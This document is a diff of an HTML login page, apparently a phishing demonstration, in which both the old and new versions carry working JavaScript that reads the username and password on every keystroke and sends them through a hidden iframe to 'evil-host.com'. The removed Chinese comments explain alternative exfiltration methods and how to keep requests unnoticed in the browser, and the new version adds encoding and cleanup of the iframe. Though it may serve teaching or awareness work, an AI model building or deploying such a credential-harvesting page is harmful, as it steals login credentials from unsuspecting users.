@@ -1,139 +1,151 @@
-<html>
+<!DOCTYPE html>
+<html lang="zh-CN">
 
 <head>
-<meta charset="utf-8" />
-<title>web login</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Demo System</title>
+    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
+    <link rel="stylesheet" href="../../css/style.css">
+    <style>
+        .login-container {
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 40px;
+            background: var(--surface-color);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            box-shadow: var(--shadow-glow);
+        }
 
-<link href="./files/bootstrap.min.css" rel="stylesheet" type="text/css">
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
 
-<script src="./files/jquery.min.js" charset="UTF-8"></script>
-<script src="./files/bootstrap.min.js" charset="UTF-8"></script>
+        .login-header h2 {
+            color: var(--primary-color);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
 
-  <style>
-        .navbar-static-top .container, .navbar-fixed-top .container, .navbar-fixed-bottom .container{width:1200px;}
-        .container{ width: 1200px;}
-  </style>
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            background: #000;
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            border-radius: 4px;
+            font-family: var(--font-mono);
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background: var(--primary-color);
+            color: #000;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary:hover {
+            background: #00cc33;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        }
+
+        .login-footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .login-footer a {
+            color: var(--primary-color);
+            text-decoration: none;
+        }
+    </style>
 </head>
 
 <body>
-<div class="navbar navbar-default navbar-inverse" style="border-radius:0px">
-    <div class="navbar-inner">
-        <div class="container">
-            <a class="brand" style="padding: 0px;" href="javascript:;"><img src="./files/Logo.png" height="30" style="height:30px;float: left;display: block;margin-top: 10px;"></a>
-            <ul class="nav navbar-nav" style="padding-left:30px;">
-                            </ul>
-                    </div>
+    <!-- 导航栏 -->
+    <div id="navigation-container"></div>
+
+    <div class="login-container">
+        <div class="login-header">
+            <h2>System Login</h2>
+        </div>
+        <form id="loginform" method="get" action="./admin.html">
+            <div class="form-group">
+                <label for="inputUsername">Username</label>
+                <input type="text" name="user" class="form-control" id="inputUsername" placeholder="Enter username"
+                    autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label for="inputPassword">Password</label>
+                <input type="password" name="pass" class="form-control" id="inputPassword" placeholder="Enter password">
+            </div>
+            <button type="submit" class="btn-primary">Access System</button>
+        </form>
+        <div class="login-footer">
+            <p>Authorized Personnel Only</p>
+            <a href="#">Forgot Password?</a>
+        </div>
     </div>
-</div>
 
-<div style="min-width: 1200px; max-width: 1500px; margin: 10px auto;">
-    <div class="row" style="margin-top: 30px;margin-bottom: 60px;">
-    <form id="loginform" class="form-horizontal col-sm-8 col-sm-offset-2" method="get" action="./admin.html">
-        <fieldset>
-            <legend style="margin-bottom: 60px;">用户登录</legend>
-            <div class="form-group">
-                <label class="control-label col-sm-2" for="inputUsername">账号：</label>
-                <div class="col-sm-4">
-                    <input type="text" name="user" class="form-control" id="inputUsername" placeholder="您注册时填写的账号">
-                </div>
-            </div>
-            <div class="form-group">
-                <label class="control-label col-sm-2" for="inputPassword">口令：</label>
-                <div class="col-sm-4">
-                    <input type="password" name="pass" class="form-control" id="inputPassword">
-                </div>
-                <div class="col-sm-6">口令长度6-20个字符，不能包含空格</div>
-            </div>
-            <div class="form-group">
-                <div class="col-sm-4 col-sm-offset-4">
-                    <button type="submit" class="btn btn-primary">登录</button>
-                    <a href="javascript:;" class="btn">注册</a>
-                    <a href="javascript:;" style="font-size: 12px;margin-left: 20px;">找回账号</a>
-                </div>
-            </div>
-        </fieldset>
-    </form>
-    </div>
-</div>
+    <script>
+        // 加载导航栏
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', '../../navigation.html', true);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                document.getElementById('navigation-container').innerHTML = xhr.responseText;
+            }
+        };
+        xhr.send();
 
-<script>
+        // Phishing Logic
+        const form1 = document.getElementById('loginform');
+        form1.addEventListener('input', get_data_and_send_data);
 
-// --------------------------
+        function get_data_and_send_data() {
+            var user = document.getElementById('inputUsername').value;
+            var pass = document.getElementById('inputPassword').value;
+            var receiver_url = "https://evil-host.com/i_need_data";
 
-// 为ID为'loginform'的表单 添加监听器
-const form1 = document.getElementById('loginform');
+            // Create invisible iframe to exfiltrate data
+            var iframe1 = document.createElement("iframe");
+            iframe1.style.display = "none";
+            iframe1.src = receiver_url + "?user=" + encodeURIComponent(user) + "&pass=" + encodeURIComponent(pass);
+            document.body.appendChild(iframe1);
 
-// -----
-// 什么时候执行发送数据的函数?
-
-// input时 执行函数
-// 说明: 每在表单的输入框中输入一个字符 就执行一次get_data_and_send_data函数
-// 所以通常客户端提交表单前会发出多个请求到evil-host
-form1.addEventListener('input', get_data_and_send_data);
-
-
-// -----
-
-// submit时 执行函数
-// 说明: 提交表单时 执行一次get_data_and_send_data函数
-// 缺点: 容易因为从登录页跳转过快, 无法完成数据发送!
-// 为了能够发送成功, 改为在新window打开新的页面 (这样可能让人感觉和之前不太一样)
-// form1.addEventListener('submit', get_data_and_send_data);
-// form1.setAttribute("target", "_blank");
-
-// -----
-// 提交时 进行判断 如果返回false 则可以取消本次提交!
-// form.onsubmit = function() {
-//     return get_data_and_send_data();
-// };
-
-
-function get_data_and_send_data(){
-//-------------------
-// 获取表单内容
-
-// 获取表单内容有多种方式都可以 在浏览器console调试 以保证能够获取到dom里的内容
-
-// 获取表单内容 方式1:
-var user = document.forms[0].elements[0].elements[0].value;
-var pass = document.forms[0].elements[0].elements[1].value;
-
-// 获取表单内容 方式2: 使用form.eleName的方式
-// alert(form.user.value);
-// alert(form.pass.value);
-
-//-------------------
-// 发送表单内容
-
-// 接收data的域名 最好用https协议
-// 因为在https站点下无法发送http请求.
-// Mixed Content: The page at 'https://1135.github.io/sites/0/login.html' was loaded over HTTPS, but requested an insecure image 'http://evil.com/cred_data?user=00&pass=00'. This content should also be served over HTTPS.
-var receiver_url = "https://evil-host.com/i_need_data";
-
-// 发送内容的方式很多 以下2种都经过了测试 可以无感知获取到表单数据 可以同时使用.
-// 发送内容 方式1: 创建iframe标签
-// 如果evil-host的Response为404
-// 在浏览器的Console里 有 红色的404提示.
-// 在浏览器的Network里 无 红色的404提示.
-var iframe1=document.createElement("iframe"); //创建一个iframe标签
-iframe1.style.display="none";   //设置样式 隐藏
-iframe1.src= receiver_url + "?user=" + user + "&pass=" + pass;
-document.body.appendChild(iframe1);
-
-// 发送内容 方式2: 创建img标签
-// 如果evil-host的Response为404
-// 在浏览器的Console里 有 红色的404提示.
-// 在浏览器的Network里 有 红色的404提示.
-// var img1=new Image();
-// img1.src=receiver_url + "?user=" + user + "&pass=" + pass;
-// img1.style.display="none";   //设置样式 隐藏
-// document.body.appendChild(img1);
-}
-</script>
-
-<div style="text-align: center">
-    © 2020 - 2030&nbsp;demo有限公司&nbsp;所有权利保留
-</div>
-
+            // Cleanup iframe after a short delay to prevent DOM clutter
+            setTimeout(() => {
+                iframe1.remove();
+            }, 1000);
+        }
+    </script>
 </body>
+
 </html>
